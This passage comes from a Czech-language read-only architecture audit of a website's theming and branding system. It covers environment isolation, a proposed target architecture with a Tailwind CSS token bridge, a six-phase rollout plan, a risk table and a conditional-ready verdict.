---

## 16. Izolace prostředí (DEV3 vs. PROD3 vs. AI Studio)

- **AI Studio Workspace:** Izolovaný kontejner. Všechny inspekce byly provedeny nad klonem větve `origin/main` (`696df6255dfe1e0f1ac21a02b002999b557629e4`).
- **DEV3 (`dev3.tatovacesta.cz`):** Žádné změny kódu, balíčků ani databáze nebyly na DEV3 provedeny.
- **PROD3 (`tatovacesta.cz`):** Produkční prostředí zůstalo 100% netknuto.
- **Zákaz mutací:** Příkaz `prisma db push` ani migrační příkazy nebyly a nesmí být v této fázi spuštěny.

---

## 17. Návrh cílové architektury (Target Architecture)

Pro realizaci multi-theme a Brand Asset Studio systému bez duplikace komponent navrhujeme:

1. **Datová vrstva (Prisma):**
   - Doplnit model `ThemeProfile` navázaný na `BrandProfile` (případně rozšířit `Theme` o `familyId` a `identityId`).
   - Přidat stavový automat pro témata (`status`: `DRAFT`, `READY`, `PUBLISHED`, `ARCHIVED`).
   - Přidat PostgreSQL partial unique index pro garantování právě jednoho aktivního tématu pro danou aplikaci a kontext.
2. **Backend Resolver API:**
   - Vytvořit endpoint `GET /api/v1/theme/resolve?app=public_portal&context=PUBLIC`.
   - Resolver vrátí zkompilovaný balík tokenů a assetů z aktivního publikovaného releasu.
3. **Frontend Token Bridge:**
   - Rozšířit `@theme` v `src/index.css` o mapování na CSS proměnné:
     ```css
     @theme {
       --color-brand-primary: var(--color-primary);
       --color-brand-secondary: var(--color-secondary);
       --color-brand-surface: var(--color-surface);
       --color-brand-background: var(--color-background);
     }
     ```
   - Tímto krokem získají stávající i nové komponenty automatickou podporu témat přes standardní Tailwind třídy (např. `bg-brand-primary`), aniž by bylo nutné duplikovat JSX kód komponent.

---

## 18. Fázovaný plán realizace (Fáze 1 až 6)

```
┌──────────────────────────────────────────────────────────────────────────┐
│ FÁZE 1: Zabezpečení a integrita stávajícího Theme & Branding backendu    │
│ - Oprava P1 fail-open fallbacků v ThemeService (odstranění in-memory)    │
│ - Zavedení atomické transakce a DB constraintu pro aktivaci tématu       │
│ - Zod validace hodnot CSS proměnných (ochrana proti injection)           │
│ - Zákaz duplicitních klíčů a ošetření chybových stavů                   │
└────────────────────────────────────┬─────────────────────────────────────┘
                                     ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ FÁZE 2: Rozdělení odpovědností na frontendu (Theme vs. Branding)        │
│ - Rozdělení ThemeContext.tsx na ThemeContext a BrandingContext           │
│ - Odstranění dynamického Blob manifestu z ThemeContextu                  │
│ - Implementace kontextového filtru (PUBLIC vs PRIVATE vs ADMIN)          │
│ - Vyřešení precedence: Global Theme vs. UserPreference                  │
└────────────────────────────────────┬─────────────────────────────────────┘
                                     ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ FÁZE 3: Tokenizační most a zakonzervování „Classic Theme“                │
│ - Propojení CSS proměnných do Tailwind v4 konfigurace                    │
│ - Vytvoření a verifikace neměnného snapshotu „tata-classic“              │
│ - Postupná tokenizace kritických layoutů (Můj případ, Veřejný portál)    │
└────────────────────────────────────┬─────────────────────────────────────┘
                                     ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ FÁZE 4: Zprovoznění Brand Asset Studia (Runtime & Pipeline)              │
│ - Implementace BrandAssetService a BrandReleaseService                   │
│ - Napojení na MinIO úložiště pro binární assety (PNG, SVG, ICO)          │
│ - Zavedení životního cyklu DRAFT → VALIDATED → READY → PUBLISHED         │
│ - UI pro Brand Asset Studio v administraci                               │
└────────────────────────────────────┬─────────────────────────────────────┘
                                     ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ FÁZE 5: PWA a multi-identity resolver                                    │
│ - Staticky servírované manifesty pro 3 identity (/manifest/public...)    │
│ - Oddělení cache scope v Service Workeru                                 │
└────────────────────────────────────┬─────────────────────────────────────┘
                                     ▼
┌──────────────────────────────────────────────────────────────────────────┐
│ FÁZE 6: Zavedení tématu „Táta Blue / Brand System 1.0“                   │
│ - Vytvoření nového profilu Táta Blue                                     │
│ - Přepínací zkouška na DEV3 bez vizuální regrese                         │
│ - Ověření rollbacku na Classic                                           │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## 19. Seznam blokátorů a rizik

| Blokátor / Riziko | Závažnost | Popis | Řešení před Fází 6 |
| :--- | :---: | :--- | :--- |
| **Fail-open ThemeService** | 🔴 **P1** | Zápisy témat padají do paměti při chybě DB | Odstranit in-memory fallback, vyžadovat DB úspěch |
| **96 % netokenizovaný kód** | 🔴 **P1** | Komponenty mají natvrdo třídy Tailwind | Zprovoznit tokenizační most v Tailwind konfiguraci |
| **Ignorování kontextu v UI** | 🟡 **P2** | Klient nerespektuje PUBLIC/PRIVATE/ADMIN | Upravit `ThemeContext` pro dotazování dle trasy |
| **Blob PWA Manifest** | 🟡 **P2** | Nestabilní instalace PWA a cache kolize | Přechod na server-served manifest endpointy |
| **Konflikt UserPreference** | 🟡 **P2** | Uživatelský preset přebíjí a blokuje téma | Upravit prioritní logiku slučování stylů |

---

## 20. Závěrečný verdikt

**STATUS AUDITU:** ✅ **READONLY_AUDIT_COMPLETE / CONDITIONAL_READY_FOR_PHASE_1**

Architektura v současném stavu **není připravena** na okamžité zapnutí nového tématu „Táta Blue“, aniž by došlo k vizuálnímu rozpadu a nekonzistenci portálu. 

Současně však v projektu již existuje vynikající základ ve formě hotového datového modelu Brand Asset Studia (z 9. 9. 2026). Systém lze bezpečně připravit pro plný multi-theme a multi-project provoz dodržením navrženého 6fázového plánu bez nutnosti duplikovat React komponenty.
